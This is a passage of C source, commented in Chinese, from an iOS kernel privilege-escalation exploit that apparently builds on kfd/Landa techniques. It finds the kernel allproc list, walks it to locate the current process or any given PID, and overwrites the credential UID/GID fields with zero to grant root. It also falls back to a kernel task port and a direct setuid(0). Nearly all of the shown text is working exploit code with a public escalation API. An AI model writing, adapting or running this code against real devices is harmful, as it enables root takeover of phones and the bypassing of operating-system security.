            if (mv_kread64(scan, &tv) == 0) {
                if ((tv & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
                    LOG("   扫描到内核指针: 0x%llx @ 0x%llx", tv, scan);
                    // 找到 allproc: 读取 p_list.le_next
                    uint64_t next = 0;
                    if (mv_kread64(scan + PROC_LIST_NEXT, &next) == 0
                        && (next & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
                        LOG("✅ 疑似 allproc: 0x%llx → next=0x%llx", scan, next);
                        g_lc.allproc_kaddr = scan;
                        g_ready = 1;
                        return 0;
                    }
                }
            }
        }
        mach_port_deallocate(mach_task_self(), g_kernel_task);
        g_kernel_task = MACH_PORT_NULL;
        g_method = 0;
    } else {
        LOG("host_get_special_port 失败: kr=0x%x", kr);
    }

    // 方法3: Landa (iOS 15.x)
    if (g_osversion.major == 15) {
        LOG("===== Landa 路径 =====");
        if (landa_exploit() == 0) {
            return 0;
        }
    }

    SETERR("所有内核访问方式均失败");
    return -1;
}

// ============================================================
// 清理 Landa 资源
// ============================================================
static void landa_cleanup(void) {
    // 释放 IOSurface
    for (int i = 0; i < g_lc.nsurfaces; i++) {
        if (g_lc.surfaces[i]) {
            CFRelease(g_lc.surfaces[i]);
            g_lc.surfaces[i] = NULL;
        }
    }
    g_lc.nsurfaces = 0;

    // 释放 VME
    task_t self = mach_task_self();
    for (int i = 0; i < LANDA_VME_SRC_COUNT; i++) {
        if (g_lc.vme_src[i]) {
            munlock((void*)g_lc.vme_src[i], g_lc.vme_size);
            mach_vm_deallocate(self, g_lc.vme_src[i], g_lc.vme_size);
            g_lc.vme_src[i] = 0;
        }
    }
    for (int i = 0; i < LANDA_VME_DST_COUNT; i++) {
        if (g_lc.vme_dst[i]) {
            munlock((void*)g_lc.vme_dst[i], g_lc.vme_size);
            mach_vm_deallocate(self, g_lc.vme_dst[i], g_lc.vme_size);
            g_lc.vme_dst[i] = 0;
        }
    }

    // 关闭 IOSurfaceRoot 连接
    if (g_lc.conn) {
        IOServiceClose(g_lc.conn);
        g_lc.conn = 0;
    }

    g_lc.puaf_done = 0;
    g_lc.victim_idx = -1;
    g_lc.victim_page = 0;
    g_lc.surf_map_addr = 0;
    LOG("Landa 资源已清理");
}

// ============================================================
// allproc 遍历：找到当前进程
// ============================================================
static int find_self_proc(void) {
    pid_t mypid = getpid();
    LOG("在 allproc 链表中查找 PID=%d...", mypid);

    uint64_t allproc_head = g_lc.allproc_kaddr;
    if (allproc_head == 0 && g_offs) {
        allproc_head = g_offs->allproc;
    }
    if (allproc_head == 0) {
        SETERR("allproc 地址未知");
        return -1;
    }

    uint64_t proc = 0;
    if (kread64(allproc_head, &proc) != 0) {
        SETERR("无法读取 allproc");
        return -1;
    }
    LOG("allproc head @ 0x%llx, first proc @ 0x%llx", allproc_head, proc);

    uint64_t first = proc;
    for (int i = 0; i < 4096 && proc != 0; i++) {
        uint64_t next = 0;
        kread64(proc + PROC_LIST_NEXT, &next);

        uint64_t pv = 0;
        if (kread64(proc + PROC_PID, &pv) == 0) {
            pid_t pid = (pid_t)(uint32_t)pv;
            if (pid == mypid) {
                LOG("✅ 找到当前进程: proc=0x%llx (iter=%d)", proc, i);
                g_self_proc = proc;
                kread64(proc + PROC_UCRED, &g_self_cred);
                LOG("   ucred=0x%llx", g_self_cred);
                return 0;
            }
        }

        if (next == 0 || next == first) break;
        proc = next;
    }
    SETERR("未在 allproc 中找到 PID=%d", mypid);
    return -1;
}

// ============================================================
// kfd_get_root — 修改 ucred
// ============================================================
int kfd_get_root(void) {
    if (!g_ready) {
        LOG("无内核读写能力，尝试直接 setuid(0)...");
        int r1 = seteuid(0), r2 = setuid(0);
        LOG("seteuid=%d setuid=%d UID=%d EUID=%d", r1, r2, getuid(), geteuid());
        if (r1 == 0 || r2 == 0) { LOG("✅ 直接 setuid 成功"); return 0; }
        SETERR("kfd not ready + direct setuid failed");
        return -1;
    }

    LOG("===== 内核提权 (method=%d) =====", g_method);

    if (g_self_proc == 0) {
        if (find_self_proc() != 0) return -1;
    }

    uint64_t uc = g_self_cred;
    if (uc == 0) { SETERR("ucred 为空"); return -1; }
    LOG("ucred @ 0x%llx", uc);

    // 读取当前 UID
    uint64_t cur_uid = 0xFF;
    kread64(uc + UCRED_UID, &cur_uid);
    LOG("当前 cr_uid=0x%llx", (unsigned long long)(cur_uid & 0xFFFFFFFF));

    // 写 UID/GID 为 0
    LOG("写入 cr_uid=0...");
    if (kwrite32(uc + UCRED_UID, 0) != 0)
        { SETERR("写入 cr_uid 失败"); return -1; }

    LOG("写入 cr_ruid=0...");
    kwrite32(uc + UCRED_RUID, 0);

    LOG("写入 cr_svuid=0...");
    kwrite32(uc + UCRED_SVUID, 0);

    LOG("写入 cr_rgid=0...");
    kwrite32(uc + UCRED_RGID, 0);
    kwrite32(uc + UCRED_SVGID, 0);

    // 用户态同步
    seteuid(0); setuid(0); setgid(0);
    LOG("验证: UID=%d EUID=%d GID=%d", getuid(), geteuid(), getgid());

    if (geteuid() == 0) {
        LOG("✅ 内核提权成功！"); return 0;
    }

    // 检查内核侧是否已改
    uint64_t nu = 0xFF;
    kread64(uc + UCRED_UID, &nu);
    if ((nu & 0xFFFFFFFF) == 0) {
        LOG("✅ 内核 cr_uid 已改为 0（用户态 setuid 受限但内核已是 root）");
        return 0;
    }

    LOG("⚠ 内核写入未生效, cr_uid=0x%llx", (unsigned long long)(nu & 0xFFFFFFFF));
    return -1;
}

// ============================================================
// 公共 API
// ============================================================

int kfd_init(void) {
    safe_zero(&g_osversion, sizeof(g_osversion));
    safe_zero(&g_lc, sizeof(g_lc));
    g_ready = 0; g_method = 0;
    g_kernel_task = MACH_PORT_NULL;
    g_kernel_slide = 0;
    g_self_proc = g_self_cred = 0;
    g_offs = NULL;
    g_lc.victim_idx = -1;
    safe_zero(g_err, sizeof(g_err));

    LOG("===== init =====");
    int r = detect_osversion();
    if (r != 0) { LOG("init failed: %s", g_err); return -1; }
    LOG("init OK");
    return 0;
}

void kfd_close(void) {
    if (g_kernel_task != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), g_kernel_task);
        g_kernel_task = MACH_PORT_NULL;
    }
    if (g_method == 2) landa_cleanup();
    g_ready = 0; g_method = 0;
    g_kernel_slide = 0; g_self_proc = 0; g_self_cred = 0;
    LOG("closed");
}

int kfd_escalate(void) {
    int r = kfd_init();
    if (r != 0) return r;
    r = kfd_open();
    if (r != 0) return r;
    r = kfd_get_root();
    if (r != 0 && geteuid() == 0) {
        LOG("get_root 返回错误但 EUID=0，提权可能已生效");
        return 0;
    }
    if (r == 0) LOG("escalate complete - UID=%d EUID=%d", getuid(), geteuid());
    return r;
}

int kfd_is_root(void) {
    return (getuid() == 0 || geteuid() == 0) ? 1 : 0;
}

int kfd_escalate_pid(pid_t pid) {
    if (!g_ready) { SETERR("kfd not ready"); return -1; }
    LOG("escalate_pid: 查找 PID=%d...", pid);

    uint64_t allproc_head = g_lc.allproc_kaddr;
    if (allproc_head == 0 && g_offs) allproc_head = g_offs->allproc;
    if (allproc_head == 0) { SETERR("allproc 未知"); return -1; }

    uint64_t proc = 0;
    if (kread64(allproc_head, &proc) != 0) { SETERR("读取 allproc 失败"); return -1; }

    uint64_t first = proc;
    for (int i = 0; i < 4096 && proc != 0; i++) {
        uint64_t next = 0; kread64(proc + PROC_LIST_NEXT, &next);
        uint64_t pv = 0;
        if (kread64(proc + PROC_PID, &pv) == 0) {
            if ((pid_t)(uint32_t)pv == pid) {
                LOG("✅ 找到 PID=%d, proc=0x%llx", pid, proc);
                uint64_t uc = 0;
                if (kread64(proc + PROC_UCRED, &uc) != 0) { SETERR("读取 ucred 失败"); return -1; }
                LOG("   ucred=0x%llx", uc);
                kwrite32(uc + UCRED_UID, 0);
                kwrite32(uc + UCRED_RUID, 0);
                kwrite32(uc + UCRED_SVUID, 0);
                kwrite32(uc + UCRED_RGID, 0);
                uint64_t vf = 0xFF; kread64(uc + UCRED_UID, &vf);
                LOG("   验证: cr_uid=0x%llx", (unsigned long long)(vf & 0xFFFFFFFF));
                return ((vf & 0xFFFFFFFF) == 0) ? 0 : -1;
            }
        }
        if (next == 0 || next == first) break;
        proc = next;
    }
    SETERR("未找到 PID=%d", pid);
    return -1;
}
